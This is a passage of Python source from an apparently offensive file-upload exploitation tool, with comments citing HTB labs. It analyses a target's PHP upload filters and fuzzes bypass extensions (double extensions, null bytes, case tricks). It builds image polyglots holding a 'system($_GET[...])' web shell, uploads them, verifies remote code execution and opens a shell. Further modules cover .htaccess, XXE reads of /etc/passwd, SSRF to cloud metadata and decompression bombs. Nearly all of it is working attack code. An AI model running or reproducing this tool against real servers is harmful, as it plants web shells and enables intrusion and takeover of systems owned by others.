        # IMPORTANT: Skip regexes applied to Content-Type variables — those go to
        # ct_whitelist/ct_blacklist only (extracted separately below).
        ct_var_pattern = re.compile(
            r',\s*\$(?:type|contentType|MIMEtype|mime|content_type|ct)\b', re.I)
        for m in re.finditer(r'preg_match\s*\(\s*[\'"]([^\'"]+)[\'"]\s*,', source_code):
            raw_pattern = m.group(1)

            # Check if this preg_match is applied to a CT variable — skip if so
            after_pattern = source_code[m.end() - 1:m.end() + 80]
            if ct_var_pattern.match(after_pattern):
                continue  # Will be handled by the CT-specific extraction below

            # Strip PHP regex delimiters (/pattern/ or #pattern# or ~pattern~)
            pattern = raw_pattern
            if len(pattern) >= 2 and pattern[0] == pattern[-1] and pattern[0] in "/~#":
                pattern = pattern[1:-1]
            elif pattern.startswith("/") and pattern.endswith("/"):
                pattern = pattern[1:-1]
            # Also handle /pattern/i (with flags after delimiter)
            elif re.match(r'^/.+/[imsx]*$', pattern):
                inner = re.match(r'^/(.+)/([imsx]*)$', pattern)
                if inner:
                    pattern = inner.group(1)

            # Determine if blacklist (blocks on match) or whitelist (blocks on no-match)
            # Key: look ONLY at what's immediately before THIS preg_match call
            prefix = source_code[max(0, m.start() - 30):m.start()]
            is_negated = bool(re.search(r'!\s*$', prefix))

            # Also check for === 0 or == false after the closing paren
            after_start = m.end()
            after_text = source_code[after_start:after_start + 50]
            is_zero_check = bool(re.search(r'^\s*\)\s*===?\s*0|^\s*\)\s*==\s*false', after_text))

            if is_negated or is_zero_check:
                result["whitelist_regex"].append(pattern)
                info(f"  Whitelist regex: {raw_pattern} → {pattern}")
            else:
                result["blacklist_regex"].append(pattern)
                info(f"  Blacklist regex: {raw_pattern} → {pattern}")

        # ── Detect MIME/magic checks ──
        if 'mime_content_type' in source_code or 'finfo' in source_code:
            result["mime_check"] = True
            result["needs_magic"] = True
            info("  MIME/magic byte validation detected")

        if '$_FILES' in source_code and "['type']" in source_code:
            result["needs_ct_spoof"] = True
            info("  Content-Type header check detected")

        if 'getimagesize' in source_code:
            result["magic_check"] = True
            result["needs_magic"] = True
            info("  getimagesize() validation detected")

        # ── Extract upload directory ──
        for m in re.finditer(r"""['"]([./]*[\w_-]+/[\w_/-]*)['"]""", source_code):
            path = m.group(1)
            if any(kw in path.lower() for kw in
                   ['upload', 'file', 'image', 'media', 'avatar', 'submit', 'feedback', 'storage']):
                result["upload_dir"] = "/" + path.lstrip("./")
                if not result["upload_dir"].endswith("/"):
                    result["upload_dir"] += "/"
                ok(f"  Upload dir from source: {result['upload_dir']}")

        # ── Extract size limit ──
        for m in re.finditer(r'(?:size|length|filesize)\s*[><=!]+\s*(\d+)', source_code):
            result["size_limit"] = int(m.group(1))
            info(f"  Size limit: {result['size_limit']} bytes")

        # ── Extract rename pattern ──
        if "date(" in source_code and "basename" in source_code:
            result["rename_pattern"] = "date_prefix"
            info("  Files are renamed with date prefix")

        # ── Extract Content-Type filter regexes ──
        ct_whitelist = []
        ct_blacklist = []
        for m in re.finditer(r'preg_match\s*\(\s*[\'"]([^\'"]+)[\'"]\s*,\s*\$(?:type|contentType|MIMEtype|mime)',
                             source_code, re.I):
            raw_pattern = m.group(1)
            # Strip PHP regex delimiters
            pattern = raw_pattern
            if len(pattern) >= 2 and pattern[0] == pattern[-1] and pattern[0] in "/~#":
                pattern = pattern[1:-1]
            elif re.match(r'^/.+/[imsx]*$', pattern):
                inner = re.match(r'^/(.+)/([imsx]*)$', pattern)
                if inner:
                    pattern = inner.group(1)

            prefix = source_code[max(0, m.start() - 30):m.start()]
            is_negated = bool(re.search(r'!\s*$', prefix))
            if is_negated:
                ct_whitelist.append(pattern)
                info(f"  CT whitelist regex: {raw_pattern}")
            else:
                ct_blacklist.append(pattern)
                info(f"  CT blacklist regex: {raw_pattern}")
        result["ct_whitelist"] = ct_whitelist
        result["ct_blacklist"] = ct_blacklist

        # Find Content-Types that pass the CT filter
        ct_candidates = [
            "image/jpeg", "image/png", "image/gif", "image/webp",
            "image/svg+xml", "image/bmp", "image/tiff", "image/avif",
        ]
        valid_cts = []
        for ct in ct_candidates:
            passes = True
            for bl in ct_blacklist:
                try:
                    if re.search(bl, ct):
                        passes = False
                        break
                except re.error:
                    pass
            for wl in ct_whitelist:
                try:
                    if not re.search(wl, ct):
                        passes = False
                        break
                except re.error:
                    pass
            if passes:
                valid_cts.append(ct)
        result["valid_cts"] = valid_cts
        if valid_cts:
            ok(f"  Valid Content-Types: {', '.join(valid_cts[:5])}")

        # ── Compute bypass extensions ──
        # All PHP-executable extensions to test
        all_php_exts = [
            ".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".php8",
            ".pht", ".phtml", ".phar", ".phps", ".pgif", ".pHp", ".Php", ".PHP",
            ".inc", ".hta", ".shtml", ".module",
        ]

        def _test_ext_against_filters(test_filename):
            """Test a filename against all blacklist and whitelist regexes."""
            for bl in result["blacklist_regex"]:
                try:
                    if re.search(bl, test_filename):
                        return False
                    if re.search(bl, test_filename, re.I if bl != bl.lower() else 0):
                        return False
                except re.error:
                    pass
            for wl in result["whitelist_regex"]:
                try:
                    if not re.search(wl, test_filename):
                        return False
                except re.error:
                    pass
            return True

        # Phase 1: Find single extensions that bypass ALL filters
        bypass_exts = []
        blacklist_only_exts = []  # Pass blacklist but fail whitelist

        for ext in all_php_exts:
            test_filename = f"test{ext}"

            # Check blacklist
            blocked = False
            for bl in result["blacklist_regex"]:
                try:
                    if re.search(bl, test_filename) or re.search(bl, test_filename, re.I if bl != bl.lower() else 0):
                        blocked = True
                        break
                except re.error:
                    pass

            if blocked:
                continue

            # Passes blacklist — check whitelist
            passes_whitelist = True
            for wl in result["whitelist_regex"]:
                try:
                    if not re.search(wl, test_filename):
                        passes_whitelist = False
                        break
                except re.error:
                    pass

            if passes_whitelist:
                bypass_exts.append(ext)
            else:
                blacklist_only_exts.append(ext)

        # Phase 2: ALWAYS try double extensions (php_ext + image_ext)
        # This is critical: e.g. .phar bypasses blacklist /.+\.ph(p|ps|tml)/
        # but fails whitelist /^.+\.[a-z]{2,3}g$/
        # Combining as .phar.png passes BOTH because:
        #   - Blacklist checks .phar.png → no match for ph(p|ps|tml)
        #   - Whitelist checks .phar.png → last ext .png matches [a-z]{2,3}g
        # And Apache mod_mime processes .phar as PHP since .png is also recognized
        double_exts = []
        img_exts = [".jpg", ".png", ".gif", ".jpeg", ".svg", ".bmp", ".webp"]
        php_exts_to_try = blacklist_only_exts + [".php", ".phtml", ".pht", ".phar",
                                                  ".php5", ".php7", ".php8", ".phps"]
        seen_double = set()
        for ext in php_exts_to_try:
            for img_ext in img_exts:
                de = ext + img_ext
                if de in seen_double:
                    continue
                seen_double.add(de)
                if _test_ext_against_filters(f"test{de}"):
                    double_exts.append(de)

        # Phase 3: Also try reverse double (image + php) and char-injected
        reverse_doubles = []
        for img_ext in [".jpg", ".png", ".gif"]:
            for ext in blacklist_only_exts[:5]:
                de = img_ext + ext
                if _test_ext_against_filters(f"test{de}"):
                    reverse_doubles.append(de)

        # Combine results: prioritize double exts with blacklist-only exts first
        # (these are the most likely to actually work)
        priority_doubles = [de for de in double_exts
                           if any(de.startswith(e) for e in blacklist_only_exts)]
        other_doubles = [de for de in double_exts if de not in priority_doubles]

        all_bypass = bypass_exts + priority_doubles + other_doubles + reverse_doubles
        result["bypass_exts"] = all_bypass
        result["bypass_exts_single"] = bypass_exts
        result["bypass_exts_double"] = priority_doubles + other_doubles
        result["blacklist_only_exts"] = blacklist_only_exts

        if bypass_exts:
            ok(f"  Single-ext bypasses: {', '.join(bypass_exts[:10])}")
        if blacklist_only_exts:
            info(f"  Pass blacklist only: {', '.join(blacklist_only_exts[:10])}")
        if priority_doubles:
            ok(f"  Double-ext bypasses (priority): {', '.join(priority_doubles[:10])}")
        if other_doubles:
            info(f"  Double-ext bypasses (other): {', '.join(other_doubles[:10])}")
        if not all_bypass:
            warn("  No extension bypasses found — try char injection or manual testing")

        return result

    # ── SMART ATTACK — Probe-driven attack ordering ────────────────────────

    def smart_attack(self, probe_results, run_all=False, args=None):
        """
        Smart attack: probe → fuzz extensions for execution → shell → fallback modules.
        The core idea (from HTB): upload PHP hello-world, check if it EXECUTES,
        then upload real shell ONLY with executing extension.
        """
        info(f"{'─' * 50}")
        info("SMART ATTACK — Probe-driven attack ordering")
        info(f"{'─' * 50}")

        pr = probe_results or {}
        guidance = []

        # ── Prioritize discovered dirs ──
        # Move dirs that were actually found to the front of shell_dirs
        if self.d and self.d.steps:
            found_dirs = [s["detail"].split("/")[-2] + "/"
                          for s in self.d.steps
                          if s.get("category") == "dir_enum" and s.get("status") == "found"]
            for fd_entry in self.d.steps:
                if fd_entry.get("category") == "dir_enum" and fd_entry.get("status") == "found":
                    url_str = fd_entry["detail"]
                    # Extract path from URL
                    parsed = urlparse(url_str)
                    path = parsed.path
                    if path and path not in self.shell_dirs[:3]:
                        # Move to front
                        if path in self.shell_dirs:
                            self.shell_dirs.remove(path)
                        self.shell_dirs.insert(0, path)
                        info(f"Prioritized discovered dir: {path}")

        # ═══ PHASE 0: Source-Guided Attack (when XXE revealed PHP source) ═══
        # If we analyzed the upload source code, we know EXACTLY which extensions
        # bypass the filters. Try those first with magic bytes if needed.
        sa = pr.get("source_analysis")
        if sa and sa.get("bypass_exts") and not self.rce_found:
            bypass_exts = sa["bypass_exts"]
            singles = sa.get("bypass_exts_single", [])
            doubles = sa.get("bypass_exts_double", [])
            bl_only = sa.get("blacklist_only_exts", [])
            valid_cts = sa.get("valid_cts", [])

            info(f"Phase 0: Source-guided attack — {len(singles)} single + {len(doubles)} double extensions")
            if bl_only:
                info(f"  Key insight: {', '.join(bl_only[:5])} bypass blacklist → double ext needed")

            # Determine Content-Type and build REAL polyglot images
            # Critical: mime_content_type() checks actual file bytes, not just magic prefix
            # We need VALID image files with PHP embedded properly
            marker = f"UPLOADPWN_{random.randint(100000,999999)}"
            use_polyglot = False

            if valid_cts:
                # Pick the best CT that we can build a valid polyglot for
                # Prefer image/png > image/jpeg (more reliable polyglot)
                # IMPORTANT: image/gif may NOT match filters like /image\/[a-z]{2,3}g/
                # because 'gif' ends in 'f' not 'g'
                ct = None
                for preferred in ["image/png", "image/jpeg", "image/gif",
                                  "image/bmp", "image/webp"]:
                    if preferred in valid_cts:
                        ct = preferred
                        break
                if not ct:
                    ct = valid_cts[0]
                ok(f"  Using CT: {ct} (passes CT filter)")
                use_polyglot = True
            elif sa.get("needs_magic"):
                ct = "image/png"  # PNG is safest default for polyglots
                use_polyglot = True
            elif sa.get("needs_ct_spoof"):
                ct = "image/jpeg"
                use_polyglot = False
            else:
                ct = "application/x-php"
                use_polyglot = False

            # Build content using REAL valid images (pass mime_content_type)
            if use_polyglot:
                test_php = f"<?php echo '{marker}'; ?>".encode()
                shell_php = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
                if ct == "image/png":
                    test_content = make_png_text_shell(test_php)
                    shell_content = make_png_text_shell(shell_php)
                elif ct == "image/jpeg":
                    test_content = make_jpeg_text_shell(test_php)
                    shell_content = make_jpeg_text_shell(shell_php)
                elif ct == "image/gif":
                    test_content = b"GIF89a;\n" + test_php
                    shell_content = b"GIF89a;\n" + shell_php
                else:
                    # Fallback: prepend PNG magic (most universally recognized)
                    test_content = make_png_text_shell(test_php)
                    shell_content = make_png_text_shell(shell_php)
                    ct = "image/png"
            else:
                test_content = f"<?php echo '{marker}'; ?>".encode()
                shell_content = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"

            # Build date prefixes for file lookup (the source may use date('ymd')_filename)
            import datetime
            now = datetime.datetime.now()
            date_prefixes = [
                "",  # no prefix
                now.strftime("%y%m%d") + "_",           # date('ymd')_
                now.strftime("%Y%m%d") + "_",           # date('Ymd')_
                now.strftime("%y%m%d%H%M%S") + "_",    # date('ymdHis')_
                now.strftime("%Y-%m-%d") + "_",         # date('Y-m-d')_
            ]
            if sa.get("rename_pattern") == "date_prefix":
                ok(f"  Files renamed with date prefix: trying {date_prefixes[1]}...")

            for ext in bypass_exts:
                if self.rce_found:
                    break
                fname = f"srcbypass{ext}"
                s, b, resp = self.upload(fname, test_content, ct)
                if self.is_success(s, b):
                    ok(f"Source-bypass upload accepted: {fname}")

                    # Extract server-side filename from response if available
                    server_name = self._process_upload_response(fname, b, resp) if hasattr(self, '_process_upload_response') else None
                    check_names = [fname]
                    if server_name:
                        check_names.insert(0, server_name)
                    # Add date-prefixed variants
                    for dp in date_prefixes:
                        if dp:
                            check_names.append(f"{dp}{fname}")
                            if server_name:
                                check_names.append(f"{dp}{server_name}")

                    # Deduplicate while preserving order
                    check_names = list(dict.fromkeys(check_names))

                    # Try to find and execute it
                    for d in self.shell_dirs[:12]:
                        for cn in check_names:
                            url = f"{self.sm.target}{d}{cn}"
                            try:
                                r = self.sm.session.get(url, timeout=8)
                                if r.status_code == 200 and marker in r.text:
                                    ok(f"PHP executes at: {url}")
                                    # Upload real shell with same extension
                                    shell_name = f"shell{ext}"
                                    self.upload(shell_name, shell_content, ct)
                                    # Build check names for shell
                                    shell_checks = [shell_name]
                                    for dp in date_prefixes:
                                        if dp:
                                            shell_checks.append(f"{dp}{shell_name}")
                                    shell_checks = list(dict.fromkeys(shell_checks))
                                    for scn in shell_checks:
                                        shell_url = f"{self.sm.target}{d}{scn}"
                                        rce_ok, rurl, param, out = self.verify_rce(scn, None)
                                        if rce_ok:
                                            self.launch_shell(scn, rurl, param, out,
                                                              "source_guided", ct)
                                            return rurl, scn
                                        # Also try direct URL check
                                        try:
                                            r2 = self.sm.session.get(
                                                f"{shell_url}?{self.cmd_param}=id", timeout=8)
                                            if r2.status_code == 200 and re.search(r'uid=\d+', r2.text):
                                                pwn(f"Source-guided RCE at {shell_url}")
                                                self.rce_found = True
                                                if self.d:
                                                    self.d.record_rce(scn, shell_url,
                                                                      self.cmd_param, "source_guided")
                                                return shell_url, scn
                                        except:
                                            pass
                            except:
                                pass

            if not self.rce_found:
                info("Source-guided extensions didn't execute — continuing with full fuzz")

        # ═══ PHASE 1: Extension Execution Fuzz (THE HTB APPROACH) ═══
        # Upload PHP hello-world with each extension, check which EXECUTE
        # This is the fastest and most reliable approach

        if not self.rce_found:
            # If source analysis gave us bypass exts, prioritize those in the fuzz
            priority_exts = sa["bypass_exts"] if sa and sa.get("bypass_exts") else None
            result = self.attack_ext_execute_fuzz(extensions=priority_exts)
            if result and result[0]:
                return result

        # ═══ PHASE 2: Config file attacks (.htaccess / .user.ini / web.config) ═══
        if not self.rce_found:
            info("No extension executed PHP — trying config file attacks...")
            self.attack_htaccess()
            if self.rce_found:
                return self._last_rce()
        if not self.rce_found:
            self.attack_userini()
            if self.rce_found:
                return self._last_rce()

        # ═══ PHASE 3: Polyglots (valid images with embedded PHP) ═══
        if not self.rce_found:
            info("Trying polyglot images...")
            self.attack_png_polyglot()
            if not self.rce_found:
                self.attack_jpeg_polyglot()
            if not self.rce_found:
                self.attack_gif_polyglot()
            if self.rce_found:
                return self._last_rce()

        # ═══ PHASE 4: Character injection ═══
        if not self.rce_found:
            self.attack_char_injection()
            if self.rce_found:
                return self._last_rce()

        # ═══ PHASE 5: Full matrix (threaded, all combos) ═══
        if not self.rce_found:
            self.attack_matrix()
            if self.rce_found:
                return self._last_rce()

        # ═══ PHASE 6: Advanced techniques ═══
        if not self.rce_found:
            info("Phase 6: Advanced bypass techniques...")
            self.attack_raw_null_byte()
        if not self.rce_found:
            self.attack_boundary_confusion()
        if not self.rce_found:
            self.attack_chunked()
        if not self.rce_found:
            self.attack_path_traversal()
        if not self.rce_found:
            self.attack_double_content_disposition()
        if not self.rce_found:
            self.attack_unicode_norm()
        if self.rce_found:
            return self._last_rce()

        # Server-specific
        techs = (self.d.server_info.get("technologies", []) if self.d else [])
        if not self.rce_found and any("IIS" in t or "ASP" in t for t in techs):
            self.attack_webconfig()
            if not self.rce_found:
                self.attack_iis_semicolon()
        if not self.rce_found and any("Java" in t for t in techs):
            self.attack_war_deploy()
        if self.rce_found:
            return self._last_rce()

        # ═══ PHASE 6.5: Document XXE (if SVG blocked) ═══
        if not self.rce_found:
            info("Phase 6.5: Document XXE attacks...")
            flag = self.flag_path or "/etc/passwd"
            self.attack_document_xxe(flag, "docx")
            self.attack_document_xxe(flag, "xlsx")

        # ═══ PHASE 6.6: Filename injection ═══
        if not self.rce_found:
            info("Phase 6.6: Filename injection attacks...")
            self.attack_filename_injection()
        if self.rce_found:
            return self._last_rce()

        # ═══ PHASE 6.7: PHP-FPM pathinfo + Apache unrecognized ext ═══
        if not self.rce_found:
            self.attack_phpfpm_pathinfo()
        if not self.rce_found:
            self.attack_apache_unrecognized_ext()
        if self.rce_found:
            return self._last_rce()

        # ═══ PHASE 7: Last resort RCE ═══
        if not self.rce_found:
            self.attack_race()
        if not self.rce_found:
            self.attack_lfi_chain()
        if not self.rce_found:
            self.attack_ssi()
        if not self.rce_found:
            self.attack_cgi_upload()
        if not self.rce_found:
            self.attack_put_method()
        if not self.rce_found:
            self.attack_phar_deser()
        if not self.rce_found:
            self.attack_multipart_pollution()
        if not self.rce_found:
            self.attack_cte_base64()
        if not self.rce_found:
            self.attack_path_truncation()
        if not self.rce_found:
            self.attack_htaccess_race()
        if not self.rce_found:
            self.attack_ghostscript()
        if self.rce_found:
            return self._last_rce()

        # ═══ PHASE 8: Non-RCE attacks + info gathering ═══
        if not self.rce_found:
            info("Phase 8: Additional attack modules...")
            self.attack_win83_shortname()
            self.attack_filename_injection()
        if self.rce_found:
            return self._last_rce()

        # Info-only attacks (XSS, DoS, SSRF probes)
        self.attack_exif_xss()
        self.attack_stored_xss()
        self.attack_ssrf_metadata()
        self.attack_decompression_bomb()
        self.attack_pixel_flood()

        # ═══ Final guidance ═══
        print(f"\n{R}{BOLD}  No RCE achieved. Manual steps to try:{W}")
        print(f"    1. Check upload dir — use --svg-src upload.php to find it")
        print(f"    2. Inspect traffic: --proxy http://127.0.0.1:8080")
        print(f"    3. Try custom field: --field <name>")
        print(f"    4. Try --all for exhaustive scan")
        print(f"    5. Some servers need login first: --login /login.php --user admin --pass admin")
        print(f"    6. Try --no-interact to skip prompts and use all defaults")
        print(f"    7. Try --filter-matrix for systematic filter mapping")
        print()

        return None, None

    def _last_rce(self):
        """Return the last RCE result from discovery."""
        if self.d and self.d.rce:
            r = self.d.rce[-1]
            return r["file"], r["url"]
        return None, None

    # ── MODULE: Extension Execution Fuzz (THE HTB APPROACH) ─────────────────

    def attack_ext_execute_fuzz(self, extensions=None):
        """
        The correct HTB approach:
        1. Upload PHP hello-world with each extension
        2. GET the uploaded file
        3. If response contains the OUTPUT (not PHP tags), that extension EXECUTES PHP
        4. Upload real shell ONLY with executing extension

        This is 100x more reliable than blind shell upload + uid= check.
        """
        info(f"{'─' * 50}")
        info("MODULE: Extension Execution Fuzz (upload → check execution)")
        info(f"{'─' * 50}")

        # Unique marker so we know it's our code executing
        marker = f"UPLOADPWN_{random.randint(100000,999999)}"
        test_content_plain = f"<?php echo '{marker}'; ?>".encode()
        test_content_gif = f"GIF89a;\n<?php echo '{marker}'; ?>".encode()

        # Build extension list
        if extensions:
            exts = extensions
        else:
            # Comprehensive PHP extension list (from SecLists web-extensions + extras)
            exts = [
                # ── Direct PHP extensions ──
                ".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7",
                ".php8", ".pht", ".phtml", ".phar", ".phps", ".pgif", ".inc",
                ".hta", ".shtml", ".module",
                # ── Case variations ──
                ".PHP", ".Php", ".pHp", ".phP", ".PHp", ".PhP", ".pHP",
                ".PHTML", ".Phtml", ".pHtMl", ".Pht", ".PHT", ".Phar",
                # ── Double extensions (passes whitelist: ends with image) ──
                ".php.jpg", ".php.png", ".php.gif", ".php.jpeg",
                ".phtml.jpg", ".phtml.png", ".phtml.gif",
                ".pht.jpg", ".pht.png", ".pht.gif",
                ".phar.jpg", ".phar.png", ".phar.gif",
                ".php5.jpg", ".php5.png", ".php7.jpg",
                # ── Reverse double ext (Apache FilesMatch misconfiguration) ──
                ".jpg.php", ".png.php", ".gif.php", ".jpeg.php",
                ".jpg.phtml", ".png.phtml", ".gif.phtml",
                ".jpg.pht", ".png.pht", ".gif.pht",
                ".jpg.phar", ".png.phar", ".gif.phar",
                ".jpg.php5", ".png.php5", ".jpg.php7",
                # ── Null byte (PHP <5.4) ──
                ".php%00.jpg", ".php%00.png", ".php%00.gif",
                ".phtml%00.jpg", ".pht%00.jpg", ".phar%00.jpg",
                # ── Character injection between extensions ──
                ".php%20", ".php%0a", ".php.", ".php...",
                ".php%0a.jpg", ".php%0d%0a.jpg", ".php%09.jpg",
                ".php%20.jpg", ".php%20.png",
                ".phtml%20.jpg", ".phtml%0a.jpg",
                ".pht%20.jpg", ".pht%0a.jpg",
                # ── Trailing chars ──
                ".php%20", ".php%0a", ".php%00", ".php::$DATA",
                ".phtml%20", ".phtml%0a",
            ]
            # Deduplicate
            exts = list(dict.fromkeys(exts))

        # Use magic bytes if MIME filter was detected
        use_magic = self.d and self.d.filters.get("MIME/Magic-Byte Validation") == "present"

        # Determine which dirs to check (prioritize discovered dirs)
        priority_dirs = [d for d in self.shell_dirs
                         if any(kw in d.lower() for kw in
                                ["profile", "upload", "image", "avatar", "file"])]
        other_dirs = [d for d in self.shell_dirs if d not in priority_dirs]
        check_dirs = (priority_dirs + other_dirs)[:8]  # Limit to top 8

        info(f"Testing {len(exts)} extensions × {len(check_dirs)} dirs "
             f"(magic={'yes' if use_magic else 'no'}, marker={marker})")

        # Phase 1: Upload + immediately check execution for each extension
        executing_exts = []
        accepted_exts = []

        for i, ext in enumerate(exts):
            if self.rce_found:
                break
            if i % 10 == 0:
                progress(i, len(exts), "ExtFuzz")

            fn = f"test{ext}"
            content = test_content_gif if use_magic else test_content_plain
            ct = "image/gif" if use_magic else "image/jpeg"

            # Try upload
            has_null = '\x00' in fn
            try:
                if has_null or '%' in fn:
                    # Some filenames need raw multipart
                    status, body, resp = self.upload(fn, content, ct)
                else:
                    status, body, resp = self.upload(fn, content, ct)
            except:
                continue

            if not self.is_success(status, body):
                continue

            accepted_exts.append(ext)

            # Check if upload response itself contains the marker (rare but possible)
            if marker in body and "<?php" not in body:
                pwn(f"PHP EXECUTES in upload response! Extension: {ext}")
                executing_exts.append(ext)
                continue

            # Check if the uploaded file EXECUTES PHP
            server_name = self._process_upload_response(fn, body, resp)
            executes, exec_url = self.check_execution(fn, marker, server_name)
            if executes:
                pwn(f"PHP EXECUTES! Extension: {ext} → {exec_url}")
                executing_exts.append(ext)
                if self.d:
                    self.d.filter_bypassed("Extension Filter",
                        f"Extension {ext} executes PHP at {exec_url}")
                    self.d.record_vuln("PHP Execution",
                        f"Extension {ext} executes PHP code", "CRITICAL")

        print()  # Clear progress line

        ok(f"Accepted: {len(accepted_exts)} extensions | Executing: {len(executing_exts)} extensions")
        if accepted_exts:
            print(f"  {B}Accepted:{W} {', '.join(accepted_exts[:15])}")
        if executing_exts:
            print(f"  {G}{BOLD}EXECUTING PHP:{W} {', '.join(executing_exts)}")
        else:
            fail("No extensions execute PHP code")
            if accepted_exts:
                warn("Files uploaded but don't execute — try --htaccess or --polyglot")
                if self.d:
                    self.d.suggest(
                        f"Extensions accepted but don't execute PHP: {', '.join(accepted_exts[:10])}\n"
                        "  1. Try --htaccess to make accepted extensions execute PHP\n"
                        "  2. Try --polyglot for valid-image PHP polyglots\n"
                        "  3. Check if upload dir differs — use --svg-src upload.php")
            return None, None

        # Phase 2: Upload real shell with the EXECUTING extension
        info(f"Uploading real shells with executing extension(s)...")

        shells_to_try = [
            ("system", SHELLS_PHP["system"]),
            ("tiny", SHELLS_PHP["tiny"]),
            ("passthru", SHELLS_PHP["passthru"]),
            ("popen", SHELLS_PHP["popen"]),
            ("shell_exec", SHELLS_PHP["shell_exec"]),
        ]
        if use_magic:
            shells_to_try = [
                ("gif_system", SHELLS_PHP_MAGIC["gif_system"]),
                ("gif_tiny", SHELLS_PHP_MAGIC["gif_tiny"]),
                ("png_system", SHELLS_PHP_MAGIC["png_system"]),
                ("jpeg_system", SHELLS_PHP_MAGIC["jpeg_system"]),
            ] + shells_to_try

        for ext in executing_exts:
            for sname, sbytes in shells_to_try:
                if self.rce_found:
                    return self._last_rce()

                fn = f"shell{ext}"
                ct = "image/gif" if use_magic else "image/jpeg"
                s, b, resp = self.upload(fn, sbytes, ct)
                if not self.is_success(s, b):
                    continue

                ok(f"Shell uploaded: {fn} [{sname}]")
                server_name = self._process_upload_response(fn, b, resp)
                rce_ok, url, param, out = self.verify_rce(fn, server_name)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, sname, ct)
                    return fn, url

        fail("Shells uploaded with executing extension but RCE verification failed")
        if self.d:
            self.d.suggest(
                "Shell uploaded with executing extension but couldn't verify RCE.\n"
                f"  Try manually: curl '{self.sm.target}{check_dirs[0]}shell{executing_exts[0]}?cmd=id'")
        return None, None

    # ── MODULE: Extension Bypass Matrix (Two-Phase Threaded) ────────────────

    def attack_matrix(self):
        """
        Two-phase threaded matrix:
          Phase 1: Fuzz all filenames with a hello-world PHP to find ACCEPTED extensions.
                   Uses ThreadPoolExecutor for speed. ~10x faster than testing shells.
          Phase 2: Only on accepted filenames, try real shells + verify RCE.
        """
        info(f"{'─' * 50}")
        info("MODULE: Extension Bypass Matrix (two-phase, threaded)")
        info(f"{'─' * 50}")

        filenames = gen_filenames(self.server_type)
        info(f"Phase 1: Fuzzing {len(filenames)} filenames for accepted extensions...")

        # Phase 1 — fuzz extensions with a harmless test payload
        # Use magic-byte hello-world so it passes MIME + CT filters
        test_payloads = [
            (b"GIF89a;\n<?php echo 'UPLOADPWN_OK'; ?>", "image/gif"),
            (b"\xff\xd8\xff\xe0<?php echo 'UPLOADPWN_OK'; ?>", "image/jpeg"),
            (b"\x89PNG\r\n\x1a\n<?php echo 'UPLOADPWN_OK'; ?>", "image/png"),
        ]

        accepted = []          # (filename, content_type) pairs that passed upload
        accepted_lock = threading.Lock()
        fuzz_count = [0]

        def _fuzz_one(fname):
            if self.rce_found:
                return
            with accepted_lock:
                fuzz_count[0] += 1
                if fuzz_count[0] % 50 == 0:
                    progress(fuzz_count[0], len(filenames), "Fuzz")
            for test_content, test_ct in test_payloads:
                if self.rce_found:
                    return
                if self.delay:
                    time.sleep(self.delay)
                try:
                    status, body, resp = self.upload(fname, test_content, test_ct)
                except:
                    continue
                if self.is_success(status, body):
                    with accepted_lock:
                        accepted.append((fname, test_ct, body, resp))
                    ok(f"ACCEPTED: {fname} [{test_ct}]", 2)
                    return  # One CT is enough for this filename

        max_w = min(self.threads, 15)
        with ThreadPoolExecutor(max_workers=max_w) as pool:
            futures = [pool.submit(_fuzz_one, fn) for fn in filenames]
            for f in as_completed(futures):
                if self.rce_found:
                    for rem in futures:
                        rem.cancel()
                    break
        print()  # clear progress line

        if not accepted:
            fail(f"Phase 1: 0/{len(filenames)} filenames accepted")
            if self.d:
                self.d.suggest("No filenames accepted. Try: --htaccess, --polyglot, --char-inject, or --race")
            return None, None

        ok(f"Phase 1: {len(accepted)}/{len(filenames)} filenames accepted")
        for a_fn, a_ct, _, _ in accepted[:20]:
            print(f"    {G}→{W} {a_fn}  [{a_ct}]")
        if len(accepted) > 20:
            print(f"    {DIM}... and {len(accepted) - 20} more{W}")

        # Phase 2 — upload real shells ONLY on accepted filenames
        info(f"Phase 2: Testing {len(accepted)} accepted filenames with real shells...")

        shells = {}
        if self.server_type in ("php", "all"):
            shells.update(SHELLS_PHP)
            shells.update(SHELLS_PHP_MAGIC)
        if self.server_type in ("asp", "all"):
            shells.update(SHELLS_ASP)
        if self.server_type in ("jsp", "all"):
            shells.update(SHELLS_JSP)
        if self.server_type in ("cf", "all"):
            shells.update(SHELLS_CF)

        # Sort shells: try tiny/fast ones first for quicker RCE
        shell_order = ["tiny", "system", "gif_tiny", "gif_system", "png_tiny",
                       "png_system", "jpeg_tiny", "jpeg_system",
                       "passthru", "exec", "popen", "shell_exec"]
        sorted_shells = []
        for name in shell_order:
            if name in shells:
                sorted_shells.append((name, shells[name]))
        for name, content in shells.items():
            if name not in shell_order:
                sorted_shells.append((name, content))

        phase2_count = [0]
        total_p2 = len(accepted) * len(sorted_shells)

        def _try_shell(args_tuple):
            fname, best_ct, _, _ = args_tuple[0]
            sname, sbytes = args_tuple[1]
            if self.rce_found:
                return None
            if self.delay:
                time.sleep(self.delay)

            # Try the CT that worked in phase 1, plus image CTs
            cts_to_try = [best_ct]
            for extra_ct in ["image/jpeg", "image/gif", "image/png"]:
                if extra_ct != best_ct:
                    cts_to_try.append(extra_ct)

            with accepted_lock:
                phase2_count[0] += 1
                if phase2_count[0] % 20 == 0:
                    progress(phase2_count[0], total_p2, "Shells")

            for ct in cts_to_try[:3]:
                if self.rce_found:
                    return None
                try:
                    status, body, resp = self.upload(fname, sbytes, ct)
                except:
                    continue

                if not self.is_success(status, body):
                    continue

                server_name = self._process_upload_response(fname, body, resp)
                rce_ok, url, param, out = self.verify_rce(fname, server_name)
                if rce_ok:
                    return (fname, url, param, out, sname, ct)
            return None

        # Build work items: prioritize accepted filenames with exec extensions
        work = []
        for acc in accepted:
            for shell in sorted_shells:
                work.append((acc, shell))

        with ThreadPoolExecutor(max_workers=max_w) as pool:
            futures = {pool.submit(_try_shell, w): w for w in work}
            for f in as_completed(futures):
                if self.rce_found:
                    for rem in futures:
                        rem.cancel()
                    break
                r = f.result()
                if r:
                    fname, url, param, out, sname, ct = r
                    self.launch_shell(fname, url, param, out, sname, ct)
                    return fname, url
        print()

        # Phase 2 failed — provide guidance
        if accepted and not self.rce_found:
            warn("Files uploaded but no RCE — server may not execute uploaded files")
            if self.d:
                self.d.suggest(
                    f"Uploaded {len(accepted)} files but none executed. Try:\n"
